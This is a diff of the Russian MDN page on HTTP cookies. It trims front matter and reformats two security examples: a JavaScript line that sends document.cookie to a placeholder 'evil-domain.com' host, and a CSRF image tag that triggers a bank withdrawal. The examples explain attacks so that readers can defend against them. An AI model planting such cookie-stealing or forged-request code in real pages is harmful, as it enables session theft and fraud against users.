@@ -1,10 +1,6 @@
 ---
 title: HTTP-куки
 slug: Web/HTTP/Cookies
-tags:
-  - Куки
-translation_of: Web/HTTP/Cookies
-original_slug: Web/HTTP/Куки
 ---
 
 {{HTTPSidebar}}
@@ -167,7 +163,8 @@ console.log(document.cookie);
 Куки часто используются в веб-приложениях для идентификации аутентифицированного пользователя и сеанса работы. Соответственно, похищение кук из приложения может привести к захвату авторизованного сеанса пользователя. Кража кук часто осуществляется посредством социальной инженерии (Social Engineering) и использования уязвимости {{Glossary("XSS")}}.
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+new Image().src =
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 Атрибут HttpOnly помогает уменьшить эту угрозу, перекрывая доступ к кукам из JavaScript.
@@ -177,7 +174,8 @@ console.log(document.cookie);
 В [Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery) есть хороший пример {{Glossary("CSRF")}}. В сообщение, например, в чате или на форуме, включают "изображение", которое, на самом деле, представляет собой запрос к серверу банка на снятие денег:
 
 ```html
-<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
+<img
+  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
 ```
 
 Если вы аутентифицированны в своём банковском аккаунте, а куки по-прежнему действительны (и никакой дополнительной проверки не требуется), то при загрузке HTML-документа форума или чата с этим изображением деньги будут переведены с вашего счета. Для защиты от этого используется ряд методов:
